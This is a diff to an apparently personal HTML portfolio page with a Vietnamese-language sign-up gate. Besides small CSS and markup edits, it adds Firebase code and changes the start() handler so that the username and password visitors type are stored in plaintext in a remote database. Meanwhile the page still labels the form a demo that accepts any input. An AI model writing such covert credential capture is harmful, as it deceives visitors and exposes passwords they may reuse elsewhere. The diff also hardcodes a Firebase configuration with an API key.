@@ -5,6 +5,32 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Eryk - Portfolio</title>
 
+<!-- 🔥 FIREBASE -->
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyADmCQlryrBmQIuzQopZ5LCURO7RaguyuM",
+  authDomain: "mcwdlk.firebaseapp.com",
+  databaseURL: "https://mcwdlk-default-rtdb.firebaseio.com",
+  projectId: "mcwdlk",
+  storageBucket: "mcwdlk.firebasestorage.app",
+  messagingSenderId: "759205275119",
+  appId: "1:759205275119:web:63dbf1289fd58a6a9d421a"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+window.saveUser = function(user, pass){
+  set(ref(db, 'users/' + user), {
+    password: pass,
+    time: new Date().toLocaleString()
+  });
+};
+</script>
+
 <style>
 *{margin:0;padding:0;box-sizing:border-box;scroll-behavior:smooth;}
 
@@ -38,7 +64,6 @@ label{
   display:block;
   margin-top:10px;
   margin-bottom:5px;
-  opacity:0.8;
   text-align:left;
   font-size:14px;
 }
@@ -68,7 +93,6 @@ button:hover{
 /* LOADING */
 .loading{
   display:none;
-  text-align:center;
   margin-top:15px;
 }
 
@@ -89,7 +113,7 @@ button:hover{
 .portfolio{
   display:none;
   animation:fade 1s ease;
-  background: url("https://images.unsplash.com/photo-1507525428034-b723cf961d3e") no-repeat center/cover;
+  background:url("https://images.unsplash.com/photo-1507525428034-b723cf961d3e") no-repeat center/cover;
 }
 
 .portfolio::before{
@@ -105,7 +129,6 @@ button:hover{
   to{opacity:1}
 }
 
-/* NAV */
 nav{
   position:fixed;
   width:100%;
@@ -124,7 +147,6 @@ nav a{
   text-decoration:none;
 }
 
-/* HERO */
 .hero{
   height:100vh;
   display:flex;
@@ -145,7 +167,6 @@ nav a{
   text-decoration:none;
 }
 
-/* SECTION */
 .section{
   padding:80px 20px;
   max-width:1000px;
@@ -166,7 +187,7 @@ nav a{
   box-shadow:0 0 20px rgba(56,189,248,0.5);
 }
 
-.bar{height:8px;background:#020617;border-radius:10px;}
+.bar2{height:8px;background:#020617;border-radius:10px;}
 .progress{height:100%;background:#38bdf8;}
 
 .social a{
@@ -197,16 +218,16 @@ footer{
 
     <p>
       Hãy đăng ký tài khoản để truy cập vào web<br>
-      <span style="font-size:12px; opacity:0.6; color:#38bdf8;">
+      <small style="color:#38bdf8;">
         Nhập bất kỳ thông tin nào để tiếp tục (Demo)
-      </span>
+      </small>
     </p>
 
     <label>Tên tài khoản</label>
-    <input type="text" placeholder="Nhập tên tài khoản">
+    <input id="user" placeholder="Nhập tên tài khoản">
 
     <label>Mật khẩu</label>
-    <input type="password" placeholder="Nhập mật khẩu">
+    <input id="pass" type="password" placeholder="Nhập mật khẩu">
 
     <button onclick="start()">Đăng ký / Truy cập</button>
 
@@ -249,11 +270,11 @@ footer{
 <section class="section" id="skills">
   <h2>💻 Skills</h2>
   HTML
-  <div class="bar"><div class="progress" style="width:90%"></div></div>
+  <div class="bar2"><div class="progress" style="width:90%"></div></div>
   CSS
-  <div class="bar"><div class="progress" style="width:85%"></div></div>
+  <div class="bar2"><div class="progress" style="width:85%"></div></div>
   C++
-  <div class="bar"><div class="progress" style="width:70%"></div></div>
+  <div class="bar2"><div class="progress" style="width:70%"></div></div>
 </section>
 
 <section class="section" id="contact">
@@ -275,6 +296,11 @@ footer{
 
 <script>
 function start(){
+  let user = document.getElementById("user").value;
+  let pass = document.getElementById("pass").value;
+
+  saveUser(user, pass); // 🔥 lưu Firebase
+
   document.querySelector("button").style.display="none";
   document.getElementById("loading").style.display="block";
 
